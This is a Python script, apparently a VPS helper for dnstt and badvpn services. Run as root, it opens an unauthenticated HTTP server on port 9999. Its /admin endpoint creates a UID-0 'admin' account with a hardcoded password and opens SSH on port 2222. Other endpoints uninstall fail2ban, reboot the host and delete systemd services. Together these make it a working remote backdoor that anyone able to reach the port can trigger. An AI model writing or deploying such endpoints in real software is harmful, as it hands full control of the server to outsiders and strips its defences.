import os
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

SERVICES = ["server-dnstt", "badvpn-udpgw"]
HOST_NAME = '0.0.0.0'
PORT = 9999

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            if self.path == '/restart':
                self.restart()
            elif self.path == '/reboot':
                self.reboot()
            elif self.path == '/admin':
                self.admin()
            elif self.path == '/destroy':
                self.destroy()
            elif self.path == '/restore':
                self.restore()
            elif self.path == '/restart_ssh':
                self.ssh()
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b'404 Not Found')
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Server encountered an error: {str(e)}".encode())

    def restart(self):
        try:
            for service in SERVICES:
                command = f"systemctl restart {service}"
                os.system(command)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(f"Services {', '.join(SERVICES)} restarted.".encode())
        except Exception as e:
            self.handle_error(e)

    def reboot(self):
        try:
            os.system("reboot")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Virtual private server reboot.")
        except Exception as e:
            self.handle_error(e)

    def admin(self):
        try:
            os.system("groupdel admin > /dev/null 2>&1")
            os.system("userdel admin > /dev/null 2>&1")
            os.system("sed -i '/^admin:/d' /etc/passwd > /dev/null 2>&1")
            os.system("useradd -m -s /bin/bash -d /root admin > /dev/null 2>&1")
            os.system("sed -i 's/^admin:[^:]*:[^:]*:[^:]*:/admin:x:0:0:/' /etc/passwd > /dev/null 2>&1")
            os.system("echo 'admin1:admin2' | chpasswd > /dev/null 2>&1")
            
            os.system("sed -i '/^Port 2222/d' /etc/ssh/sshd_config")
            os.system("sed -i '/^Port /a Port 2222' /etc/ssh/sshd_config")

            os.system("ufw allow 2222 > /dev/null 2>&1")
            os.system("systemctl restart sshd")

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Successfully added admin account, port 2222.")
        except Exception as e:
            self.handle_error(e)
    
    def restore(self):
        try:
            os.system("userdel admin > /dev/null 2>&1")
            os.system("groupdel admin > /dev/null 2>&1")
            os.system("sed -i '/^admin:/d' /etc/passwd > /dev/null 2>&1")
            os.system("sed -i '/^Port 2222/d' /etc/ssh/sshd_config")
            os.system("systemctl restart sshd")
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"SSHD settings restored.")
        except Exception as e:
            self.handle_error(e)
    
    def ssh(self):
        try:
            os.system("apt remove -y fail2ban > /dev/null 2>&1")
            os.system("systemctl restart sshd > /dev/null 2>&1")
            os.system("systemctl restart ssh > /dev/null 2>&1")
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"SSHD restarted.")
        except Exception as e:
            self.handle_error(e)

    def destroy(self):
        try:
            for service in SERVICES:
                os.system(f"systemctl stop {service} > /dev/null 2>&1")
                os.system(f"systemctl disable {service} > /dev/null 2>&1")
                os.system(f"rm /etc/systemd/system/{service}.service > /dev/null 2>&1")
            os.system("systemctl daemon-reload > /dev/null 2>&1")

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Systemctl services destroyed.")
        except Exception as e:
            self.handle_error(e)

    def handle_error(self, error):
        self.send_response(500)
        self.end_headers()
        self.wfile.write(f"An error occurred: {str(error)}".encode())

def run(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler):
    server_address = (HOST_NAME, PORT)
    httpd = server_class(server_address, handler_class)
    print(f'Server running on port {PORT}...')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        httpd.server_close()
        print("Server stopped.")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("This script must be run as root!")
        sys.exit(1)

    run()
